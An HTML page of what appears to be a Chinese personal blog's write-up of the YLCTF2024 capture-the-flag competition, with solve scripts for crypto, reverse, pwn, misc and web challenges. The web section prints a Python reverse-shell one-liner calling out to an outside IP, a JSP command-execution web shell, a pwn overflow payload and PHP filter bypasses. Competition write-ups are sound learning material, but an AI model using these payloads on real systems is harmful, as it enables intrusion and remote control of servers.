<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>YLCTF2024 | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="前言:总排23，新生赛道11
Round 1
crypto
[round1]BREAK
e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag
from Crypto.Util.number import *
from gmpy2 import invert, gcd

p = 112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541
q = 177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613
c = 2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456

n = p * q

phi = (p - 1) * (q - 1)

def generate_primes(start, end):
    primes = []
    for num in range(start, end + 1):
        if isPrime(num):
            primes.append(num)
    return primes

for e in generate_primes(55555, 66666):
    if gcd(e, phi) == 1:
        try:
            d = invert(e, phi)
            m = pow(c, d, n)

           
            flag = long_to_bytes(m).decode('utf-8')
            print(f&#34;找到 e = {e}, 解密后的 flag: {flag}&#34;)
            break  
        except ZeroDivisionError:
            continue  # 如果 invert 失败，则继续尝试下一个 e
        except UnicodeDecodeError:
            continue  # 如果解码失败，则继续尝试下一个 e

# YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be}
[round1]signrsa
RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/ctf/ylctf2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/ctf/ylctf2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/ctf/ylctf2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="YLCTF2024"><meta property="og:description" content="前言:总排23，新生赛道11
Round 1 crypto [round1]BREAK e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag
from Crypto.Util.number import * from gmpy2 import invert, gcd p = 112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541 q = 177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613 c = 2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456 n = p * q phi = (p - 1) * (q - 1) def generate_primes(start, end): primes = [] for num in range(start, end + 1): if isPrime(num): primes.append(num) return primes for e in generate_primes(55555, 66666): if gcd(e, phi) == 1: try: d = invert(e, phi) m = pow(c, d, n) flag = long_to_bytes(m).decode('utf-8') print(f&#34;找到 e = {e}, 解密后的 flag: {flag}&#34;) break except ZeroDivisionError: continue # 如果 invert 失败，则继续尝试下一个 e except UnicodeDecodeError: continue # 如果解码失败，则继续尝试下一个 e # YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be} [round1]signrsa RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-17T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-17T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="YLCTF2024"><meta name=twitter:description content="前言:总排23，新生赛道11
Round 1
crypto
[round1]BREAK
e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag
from Crypto.Util.number import *
from gmpy2 import invert, gcd

p = 112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541
q = 177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613
c = 2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456

n = p * q

phi = (p - 1) * (q - 1)

def generate_primes(start, end):
    primes = []
    for num in range(start, end + 1):
        if isPrime(num):
            primes.append(num)
    return primes

for e in generate_primes(55555, 66666):
    if gcd(e, phi) == 1:
        try:
            d = invert(e, phi)
            m = pow(c, d, n)

           
            flag = long_to_bytes(m).decode('utf-8')
            print(f&#34;找到 e = {e}, 解密后的 flag: {flag}&#34;)
            break  
        except ZeroDivisionError:
            continue  # 如果 invert 失败，则继续尝试下一个 e
        except UnicodeDecodeError:
            continue  # 如果解码失败，则继续尝试下一个 e

# YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be}
[round1]signrsa
RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://blog.0ran9e.cn/posts/ctf/"},{"@type":"ListItem","position":3,"name":"YLCTF2024","item":"http://blog.0ran9e.cn/posts/ctf/ylctf2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"YLCTF2024","name":"YLCTF2024","description":"前言:总排23，新生赛道11\nRound 1 crypto [round1]BREAK e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag\nfrom Crypto.Util.number import * from gmpy2 import invert, gcd p = 112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541 q = 177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613 c = 2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456 n = p * q phi = (p - 1) * (q - 1) def generate_primes(start, end): primes = [] for num in range(start, end + 1): if isPrime(num): primes.append(num) return primes for e in generate_primes(55555, 66666): if gcd(e, phi) == 1: try: d = invert(e, phi) m = pow(c, d, n) flag = long_to_bytes(m).decode(\u0026#39;utf-8\u0026#39;) print(f\u0026#34;找到 e = {e}, 解密后的 flag: {flag}\u0026#34;) break except ZeroDivisionError: continue # 如果 invert 失败，则继续尝试下一个 e except UnicodeDecodeError: continue # 如果解码失败，则继续尝试下一个 e # YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be} [round1]signrsa RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密\n","keywords":["ctf"],"articleBody":"前言:总排23，新生赛道11\nRound 1 crypto [round1]BREAK e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag\nfrom Crypto.Util.number import * from gmpy2 import invert, gcd p = 112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541 q = 177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613 c = 2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456 n = p * q phi = (p - 1) * (q - 1) def generate_primes(start, end): primes = [] for num in range(start, end + 1): if isPrime(num): primes.append(num) return primes for e in generate_primes(55555, 66666): if gcd(e, phi) == 1: try: d = invert(e, phi) m = pow(c, d, n) flag = long_to_bytes(m).decode('utf-8') print(f\"找到 e = {e}, 解密后的 flag: {flag}\") break except ZeroDivisionError: continue # 如果 invert 失败，则继续尝试下一个 e except UnicodeDecodeError: continue # 如果解码失败，则继续尝试下一个 e # YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be} [round1]signrsa RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密\nimport gmpy2 from Crypto.Util.number import * n1 = 18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727 n2 = 20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951 e = 65537 q = gmpy2.gcd(n1,n2) print(q) # 10210039189276167395636779557271057346691950991057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441 p1 = n1 // q p2 = n2 // q d1 = gmpy2.invert(e,(q-1)*(p1-1)) d2 = gmpy2.invert(e,(q-1)*(p2-1)) c = 17087345023822081623891751423634072935359933429883025338799316908134539732911987403379813791051721409025872046014445468757120127961953783792146805906255385927316168869306218712056692227481252348951991457948040258007096536015704568840248330993815252823424627958278346871867901249369170134106070695916355118499922945313335801615652226556995849239616859826762866841805915253356402366997693599487016453619500217382302173033771577307792501865322742699412806457301297719922487797626724702793650939979227432331932830374740050145956182452965260035182810782721888226896944881610943610565496963461471122317296063535420461202109 m = pow(c,d2,n2) m = pow(m,d1,n1) print(long_to_bytes(m)) # b'YLCTF{6567543c-e55b-4563-96ea-e7412e6834c2}\\n' [round1]ezrsa 也是类共模攻击\nfrom Crypto.Util.number import long_to_bytes, inverse from math import gcd hint = 74749248594786596691182255254760227675255640419811402596325257219264047909491854266322448991637721043565574231631858096560042784343181104155107927958136483921037567399591407065870395299938514992590953052021824859260647798407649617552126176876304021384535351268838294566489926141346712140945311688664783400430 n = 146150746308368977558105420785404636106107297097656606561134260305844960246816673265377081884447744494438593580830134146856713782255534506122943914554490808124199966427121519694676728571857729213721192818898378912680306144869946238782714021401494162427357692727211780506245166118326256365562777182481342235649 c = 12817272835509631426126672293486991243028800172545793296231214648592002361121076145968763436527652893903622692932403498323802323146995559960945697843044017192966527560462131618029760025950956635249851792561073659666145624864040328809279977987225518572316396679320621448299428750551755789817002220213790188515 e = 65537 p = gcd(pow(20240918, e, n) - hint, n) q = n // p d = inverse(e, (p - 1) * (q - 1)) flag = long_to_bytes(pow(c, d, n)) print(flag) # b'YLCTF{12f142fc-351d-486f-aaa6-b64ebf3e7bdf}\\n' [round1]r(A)=3 典型的矩阵问题，进行交互循环300次得到flag\nfrom pwn import * import numpy as np p = remote('challenge.yuanloo.com', 23115) for attempt in range(300): try: print(f\"Attempt {attempt + 1}...\") line = p.recvuntil(\":\".encode()) print(f\"Received: {line.decode().strip()}\") line = p.recvuntil(\"x=\".encode()) equation_str = line.decode().strip() print(f\"Received: {equation_str}\") equations = equation_str.split(\"\\n\") A = [] B = [] for i, eq in enumerate(equations): if i == len(equations) - 1: # 忽略最后一行 continue left, right = eq.split(\"=\") B.append(float(right.strip())) # 提取系数 coefficients = [0, 0, 0] # 对应 x, y, z 的系数 for term in left.split(\"+\"): term = term.strip() if \"x\" in term: coefficients[0] = float(term.split(\"*\")[0]) if \"*\" in term else 1.0 elif \"y\" in term: coefficients[1] = float(term.split(\"*\")[0]) if \"*\" in term else 1.0 elif \"z\" in term: coefficients[2] = float(term.split(\"*\")[0]) if \"*\" in term else 1.0 A.append(coefficients) A = np.array(A) B = np.array(B) solution = np.linalg.solve(A, B) p.sendline(str(int(solution[0]))) print(f\"{solution[0]}\") line = p.recvuntil(\"y=\".encode()) print(f\"Received: {line.decode().strip()}\") p.sendline(str(int(solution[1]))) print(f\"{solution[1]}\") line = p.recvuntil(\"z=\".encode()) print(f\"Received: {line.decode().strip()}\") p.sendline(str(int(solution[2]))) print(f\"{solution[2]}\") except Exception as e: print(f\"Attempt {attempt + 1} failed: {e}\") p.interactive() [round1]threecry 参考文章https://blog.csdn.net/luochen2436/article/details/131948093\nimport gmpy2 from Crypto.Util.number import long_to_bytes e = 0xe18e crypto05= 16623038441079077059861502314553840945014390827451667324209537222817794990697456726185616589892380248771957751215156366431853682717356212256182541599038824352426429058283605462766315213017886613935143369630579915129950428539117781616821575904280675596170305716041161748779293269633614559889401304768245038227061 crypto03= 7370478569029817135349016311298954172270465460003018672225010525611372855698643108316167758095660953716705265165460646442696451806405620591202977137450538604803993325516057226246866037605963589652887018894515430484657967483718879717967258257252134148706147029651520914313120373591263784166639605955378617102045 number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683 number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947 a_near = gmpy2.iroot(number2//325,2)[0] while number2 % gmpy2.next_prime(13*a_near)!=0: a_near = gmpy2.next_prime(a_near) p = gmpy2.next_prime(13*a_near) q = number2//p phi = (p-1)*(q-1) t = gmpy2.gcd(e, phi) d = gmpy2.invert(e // t, phi) m2 = gmpy2.iroot(pow(crypto05, d, number2), t)[0] flag2 = long_to_bytes(m2) d1 = gmpy2.invert(number1, phi) m1 = pow(crypto03, d1, number2) flag1 = long_to_bytes(m1) print(flag1 + flag2) # b'YLCTF{8d547f68-f394-4254-9ada-2dc306862b66}\\n' Misc [签到] 打卡小能手 [Round 1] hide_png 给的图片用stegsolve来看，有点模糊但是可以看看\nflag没存忘了\n[Round 1] pngorzip save bin形式得到zip，010去掉114514????后面的冗杂内容进行掩码攻击得到giao，解压得到flag\nYLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}\n[Round 1] plain_crack 尝试再写个压缩包进行明文攻击\nimport zipfile import os def create(files, zfile): # 创建一个新的 ZIP 文件 with zipfile.ZipFile(zfile, 'w') as zipf: for file in files: zipf.write(file, os.path.basename(file), compress_type=zipfile.ZIP_DEFLATED) if __name__ == '__main__': files = ['build.py'] zfile = 'crack2.zip' create(files, zfile) pyadminzip我本地的轮子有问题就用了zipfile需要测试几次才可以进行明文攻击，等待几分钟直接解压里面有flag.docx，docx也是一种zip文件形式，改成zip里面有个图片得到flag\n[Round 1] trafficdet 是个ai模型分析，把要求告诉chatgpt上传对应的文件然后叫他按形式写出解密脚本就可以了\nimport pandas as pd from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier from sklearn.metrics import accuracy_score def load_and_preprocess_data(train_file, test_file): # Load training data train_data = pd.read_csv(train_file) train_data = train_data.dropna() # Separate features and labels X = train_data.drop(columns=['Label']) y = train_data['Label'] # Load test data test_data = pd.read_csv(test_file) return X, y, test_data def train_model(X_train, y_train, n_estimators=100, random_state=42): model = RandomForestClassifier(n_estimators=n_estimators, random_state=random_state) model.fit(X_train, y_train) return model def evaluate_model(model, X_val, y_val): y_pred = model.predict(X_val) accuracy = accuracy_score(y_val, y_pred) print(f'Model Accuracy: {accuracy:.2f}') return y_pred def make_predictions(model, X_test): return model.predict(X_test) def save_results(predictions, output_file): result = pd.DataFrame({'Label': predictions}) result.index += 1 # Start index at 1 result.index.name = 'id' # Rename index to 'id' result.to_csv(output_file, index=True) # Ensure the index is saved if __name__ == \"__main__\": # Load and preprocess data X, y, test_data = load_and_preprocess_data('train.csv', 'test.csv') # Split the training data into training and validation sets X_train, X_val, y_train, y_val = train_test_split(X, y, test_size=0.1, random_state=42) # Train the model model = train_model(X_train, y_train) # Evaluate the model evaluate_model(model, X_val, y_val) # Make predictions on the test data test_preds = make_predictions(model, test_data) # Save the results save_results(test_preds, 'result.csv') [Round 1] whatmusic 可以发现password单独解压，010研究是图片逆转写个脚本\nwith open('password','rb') as f: with open('flag','wb') as g: g.write(f.read()[::-1]) 然后导入010改文件尾，得到图片，然后还需要镜像一下，再进行在线网站的镜像处理得到password，然后进行解压\n然后就没有思路了，给了hint也看不懂，信息收集后发现\n死去的记忆痛击我，在今年的iscc里面就有一题是github上面的lyra项目转音频得到wav的题目，主要是要搭建环境，我这里用了香港的vps搭建版本ubuntu20,参考文章Lyra编码器基础环境搭建_lyra dajian-CSDN博客\n环境构造搭好之后用xftp传入文件然后得到wav,多听几遍得到了flag\nPwn [Round 1] giaopwn 有nx保护\nvuln有溢出点，查一下是有system和cat flag的\n利用寄存器rbi放入地址\nfrom pwn import * p = remote(\"challenge.yuanloo.com\",44805) payload= b'a'*(0x28)+p64(0x400743)+p64(0x601048)+p64(0x4006D2) p.sendline(payload) p.interactive() Re [round1]xor 简单测试一下发现有upx，脱壳一下\n分析一下简单的异或直接gpt梭个脚本\nencrypted_bytes = [ 0x45, 0x50, 0x5f, 0x48, 0x5A, 0x67, 0x25, 0x2F, 0x7E, 0x7D, 0x79, 0x29, 0x7A, 0x7D, 0x31, 0x7D, 0x29, 0x7D, 0x2E, 0x31, 0x28, 0x7D, 0x28, 0x2B, 0x31, 0x25, 0x2A, 0x25, 0x2D, 0x31, 0x2B, 0x79, 0x2A, 0x2B, 0x29, 0x2B, 0x29, 0x79, 0x28, 0x2A, 0x2F, 0x29, 0x61, 0x1C ] # 解密函数 def decrypt(encrypted_bytes): decrypted_bytes = [] for byte in encrypted_bytes: decrypted_byte = byte ^ 0x1C decrypted_bytes.append(decrypted_byte) return decrypted_bytes decrypted_values = decrypt(encrypted_bytes) decrypted_string = ''.join(chr(b) for b in decrypted_values) print(decrypted_string) [round1]ezgo ida看一下加密逻辑\nencrypted_bytes = [ 108, 122, 116, 108, 127, 65, 94, 90, 12, 15, 15, 120, 113, 118, 110, 34, 115, 112, 36, 101, 125, 46, 121, 47, 96, 119, 119, 53, 101, 127, 50, 101, 96, 100, 110, 59, 109, 57, 98, 56, 57, 56, 34 ] def decrypt(encrypted): decrypted = [] for i, byte in enumerate(encrypted): decrypted_byte = byte ^ (i + 53) decrypted.append(decrypted_byte) return bytes(decrypted) decrypted_bytes = decrypt(encrypted_bytes) print(decrypted_bytes.decode('utf-8', errors='ignore')) [round1]xorplus ida打开分析一下是rc4的加密逻辑，没学会，一股脑把加密逻辑扔给claude帮我解密，出脚本\ndef rc4_init(key): S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + ord(key[i % len(key)]) + 1300) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(S, data): i = j = 0 result = [] for byte in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) % 256] result.append(((byte - 20) \u0026 0xFF) ^ k) return bytes(result) def main(): key = \"welcometoylctf\" encrypted_data = [0x91, 0x86, 0x1b, 0x2d, 0x9e, 0x6f, 0x57, 0x5d, 0x44, 0xec, 0xa3, 0x9f, 0xcd, 0x89, 0x22, 0x65, 0x3b, 0xa3, 0x60, 0x2d, 0x80, 0x54, 0x78, 0x67, 0x6c, 0x4e, 0x81, 0x53, 0x4d, 0x26, 0x8, 0x96, 0x84, 0x46, 0x29, 0xc5, 0xb4, 0x7e, 0x29, 0xc5, 0xb9, 0x87, 0xa6] S = rc4_init(key) decrypted = rc4_crypt(S, encrypted_data) print(\"Decrypted message:\", decrypted.decode('ascii')) if __name__ == \"__main__\": main() [round 1]calc 分析解密的源码\n#include #include #include #include typedef struct Stack { double* low; int size; double* top; } stack; void init(stack* s) { s-\u003esize = 100; s-\u003elow = (double*)malloc((sizeof(double)) * 100); s-\u003etop = s-\u003elow; } void push(stack* s, double e) { *(s-\u003etop) = e; s-\u003etop++; } void pop(stack* s, double* e) { s-\u003etop--; *e = *(s-\u003etop); } int main() { setbuf(stdin, 0); setbuf(stdout, 0); stack s; double e, d; char ch; double d, e; init(\u0026s); char num[100]; int i = 0; puts(\"input data, end of '#'\"); scanf(\"%c\", \u0026ch); while (ch != '#') { while (ch \u003e= '0' \u0026\u0026 ch \u003c= '9') { num[i] = ch; i++; scanf(\"%c\", \u0026ch); } if (ch == ' ') { num[i] = '\\0'; d = atof(num); push(\u0026s, d); i = 0; } else { switch (ch) { case '+': pop(\u0026s, \u0026d); pop(\u0026s, \u0026e); push(\u0026s, e + d); break; case '-': pop(\u0026s, \u0026d); pop(\u0026s, \u0026e); push(\u0026s, e - d); break; case '*': pop(\u0026s, \u0026d); pop(\u0026s, \u0026e); push(\u0026s, e * d); break; case '/': pop(\u0026s, \u0026d); pop(\u0026s, \u0026e); push(\u0026s, e / d); break; } } scanf(\"%c\", \u0026ch); if (d == 125) { printf(\"%s\", getenv(\"GZCTF_FLAG\")); } } return 0; } 程序使用逆波兰表示法（Reverse Polish Notation，RPN）进行计算。当栈顶的值达到 125 时，程序会输出 GZCTF_FLAG。\n在栈顶产生值 125。所以能在栈顶产生 125 的 RPN 表达应该是有效的输入\n5 5 * 5 * # 尝试了一些其他的没有成功这个是成功的\nWeb [Round 1] Disal 看不出东西，看看robots.txt，有提示去f1ag.php\n\u003c?php show_source(__FILE__); include(\"flag_is_so_beautiful.php\"); $a=@$_POST['a']; $key=@preg_match('/[a-zA-Z]{6}/',$a); $b=@$_REQUEST['b']; if($a\u003e999999 and $key){ echo $flag1; } if(is_numeric($b)){ exit(); } if($b\u003e1234){ echo $flag2; } ?\u003e a是匹配是否有六个字母，b是大于这个数就行函数构造绕过就行\nimport requests url = 'http://challenge.yuanloo.com:21836/f1ag.php' payload = { 'a': '1000000eeeeee', 'b': '1235abc' } response = requests.post(url, data=payload) print(response.text) [Round 1] shxpl 测试一下常见的ls和cat都被禁用了，这里空格用%09进行绕过，联合查询一下\n然后执行cat /flag 参照上面的内容\n[Round 1] Injct 简单测了一下是xss还是ssti，发现是flask的模板注入，测试一下常见的花括号被禁了，用fenjing看看内容\npython -m fenjing crack --url http://challenge.yuanloo.com:25882/greet --inputs name --method POST 可以shell到但是试了常见的命令不能成功\n考虑到这是python写的网站，用弹个shell给我的vps,成功拿到shell得到flag\npython3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"8.130.42.113\", 5566)); [os.dup2(s.fileno(), i) for i in (0, 1, 2)]; subprocess.call([\"/bin/sh\", \"-i\"])' [Round 1] TOXEC(复现) 测试了一下发现上传jsp文件会直接杀掉，又dirsearch扫了一下发现在WEB-INF有大量的404回显，猜测可能和羊城杯的题目相似(虽然我没写bushi),先上传一个shell.xml,是jsp的回显马\n先上传这个，bp抓包改一下文件名\n\u003c% if(request.getParameter(\"cmd\")!=null){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"\"); while((a=in.read(b))!=-1){ out.print(new String(b)); } out.print(\"\"); } %\u003e 然后再上传下面这个也需要改成对应的文件格式将上面的xml解析成jsp，传入马\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ","wordCount":"9587","inLanguage":"zh-cn","datePublished":"2024-10-17T00:00:00Z","dateModified":"2024-10-17T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/ctf/ylctf2024/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=首页><span>首页</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=归档><span>归档</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=标签><span>标签</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=搜索><span>搜索</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=关于><span>关于</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-10-17 00:00:00 +0000 UTC'>October 17, 2024</span>&nbsp;·&nbsp;<span>20 min</span><h1 class=post-title>YLCTF2024</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><p>前言:总排23，新生赛道11</p><h3 id=round-1>Round 1</h3><h4 id=crypto>crypto</h4><h5 id=round1break>[round1]BREAK</h5><p>e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag</p><div class=highlight><pre tabindex=0 